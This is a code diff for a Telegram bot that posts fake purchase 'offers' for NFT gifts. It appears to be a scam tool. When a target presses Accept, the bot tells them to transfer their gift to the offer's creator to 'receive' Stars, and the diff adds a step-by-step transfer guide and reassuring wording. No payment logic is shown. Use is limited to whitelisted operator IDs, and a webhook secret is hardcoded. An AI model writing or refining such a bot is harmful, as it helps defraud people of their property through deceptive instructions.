@@ -1,7 +1,15 @@
 const ADMIN_ID = 5151757168; 
 const WEBHOOK_SECRET = "GarisOffer9231998"; 
 
-const ALLOWED_IDS = [5151757168, 9021098137, 1290278554, 883619484, 7903610791,8614618729, 8614618729];
+// Обновил ID (добавил 8614618729)
+const ALLOWED_IDS = [
+  5151757168, 
+  9021098137, 
+  1290278554, 
+  883619484, 
+  7903610791,
+  8614618729
+];
 const ALLOWED_USERNAMES = ["nogannopervi"];
 
 export default {
@@ -31,13 +39,19 @@ export default {
         const isAdmin = userId === ADMIN_ID;
         const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));
         
-        let text = "";
         if (!isAdmin && !isAllowed) {
-          text = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу: @gwrex\nВаш ID: <code>${userId}</code>`;
+          const denyText = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу: @gwrex\nВаш ID: <code>${userId}</code>`;
+          await callApi("sendMessage", { chat_id: chatId, text: denyText, parse_mode: "HTML" }, BOT_TOKEN);
         } else {
-          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n👑 <b>Владелец:</b> @gwrex\n\nОтправь оффер в Stars:\n<code>@GarisOfferBot t.me/nft/LolPop-348029 450 stars</code>\n\nОтправь оффер в Gram:\n<code>@GarisOfferBot t.me/nft/PrettyPosy-5375 500 gram</code>`;
+          // ТЕКСТ ИЗ ТВОЕГО СКРИНШОТА
+          const startText = `⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. Передача подарка возможна только после проверки условий сделки\n4. После подтверждения передачи и оплаты система обновляет статус\n5. Сделка считается завершённой после проверки передачи и оплаты\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
+          
+          const startMarkup = {
+            inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
+          };
+
+          await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
         }
-        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" }, BOT_TOKEN);
       }
 
       // --- INLINE (Создание офера) ---
@@ -78,10 +92,8 @@ export default {
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
 
-        // БЕРЕМ ДАННЫЕ ПРОДАВЦА (того, кто создал офер)
         const sellerUsername = iq.from.username || "";
         const sellerId = iq.from.id;
-        // Зашиваем ID продавца в кнопку, чтобы знать, кому передавать
         const sellerRef = sellerUsername ? sellerUsername : sellerId;
 
         const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
@@ -94,7 +106,6 @@ export default {
           input_message_content: { message_text: text, parse_mode: "HTML" },
           reply_markup: {
             inline_keyboard: [
-              // Передаем данные продавца в кнопку
               [{ text: "✅ Принять", callback_data: `acc|${amount}|${currencyType}|${sellerRef}` }],
               [{ text: "❌ Отклонить", callback_data: `dec|${amount}|${currencyType}` }]
             ]
@@ -108,33 +119,60 @@ export default {
       if (update.callback_query) {
         const cq = update.callback_query;
         
+        // --- ИНСТРУКЦИЯ "КАК ПРИНЯТЬ ОФФЕР" ---
+        if (cq.data === "how_to_accept") {
+          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
+
+          const instructionText = `🎁 <b>Пошаговая инструкция: как принять оффер и получить ⭐️</b>\n\n<b>Шаг 1.</b> Нажмите кнопку «Принять» под сообщением с предложением\n\n<b>Шаг 2.</b> Проверьте сумму и условия сделки\n\n<b>Шаг 3.</b> Откройте Профиль → Подарки в Telegram\n\n<b>Шаг 4.</b> Выберите подарок из списка своих подарков\n\n<b>Шаг 5.</b> Нажмите кнопку «Передать» в меню действий с подарком\n\n<b>Шаг 6.</b> Передавайте подарок только после проверки получателя и условий расчёта\n\n<b>Шаг 7.</b> Подтвердите передачу подарка\n\n<b>Шаг 8.</b> Дождитесь проверки передачи и оплаты\n\n✅ <b>Проверка передачи:</b>\nСтатус обновляется после фактического подтверждения получения подарка и расчёта.`;
+
+          const backMarkup = {
+            inline_keyboard: [[{ text: "Назад", callback_data: "back_to_start" }]]
+          };
+
+          try {
+            await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN);
+          } catch (e) {
+            console.error(e);
+          }
+        }
+
+        // --- ВОЗВРАТ НАЗАД К "КАК ЭТО РАБОТАЕТ" ---
+        if (cq.data === "back_to_start") {
+          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
+
+          const startText = `⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. Передача подарка возможна только после проверки условий сделки\n4. После подтверждения передачи и оплаты система обновляет статус\n5. Сделка считается завершённой после проверки передачи и оплаты\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
+
+          const startMarkup = {
+            inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
+          };
+
+          try {
+            await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
+          } catch (e) {
+            console.error(e);
+          }
+        }
+
+        // --- ОФФЕРЫ (ПРИНЯТЬ / ОТКЛОНИТЬ) ---
         if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
             
           const dataParts = cq.data.split("|");
           const action = dataParts[0];
           const amount = dataParts[1] || "0";
           const currencyType = dataParts[2] || "stars";
-          const sellerRef = dataParts[3] || ""; // Достаем данные продавца
+          const sellerRef = dataParts[3] || ""; 
           const displayCurrency = currencyType === "gram" ? "💎 Gram" : "⭐ Stars";
 
-          // Покупатель (тот, кто нажал кнопку)
           const buyer = cq.from;
           let buyerName = buyer.first_name || "";
           if (buyer.last_name) buyerName += " " + buyer.last_name;
 
-          // Ссылка на ПРОДАВЦА (того, кто создал офер)
-          let sellerLink = "https://t.me/gwrex"; // По умолчанию на тебя
-          let sellerDisplay = "@gwrex";
-
+          let sellerLink = "https://t.me/gwrex"; 
           if (sellerRef) {
               if (isNaN(sellerRef)) {
-                  // Если это ник
                   sellerLink = "https://t.me/" + sellerRef;
-                  sellerDisplay = "@" + sellerRef;
               } else {
-                  // Если это ID
                   sellerLink = `tg://user?id=${sellerRef}`;
-                  sellerDisplay = "профиль продавца";
               }
           }
 
@@ -150,7 +188,6 @@ export default {
             
             newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу.`;
             newMarkup = { 
-              // Кнопка ведет на профиль ПРОДАВЦА
               inline_keyboard: [[{ text: "🎁 Передать подарок", url: sellerLink }]] 
             };
           } else {
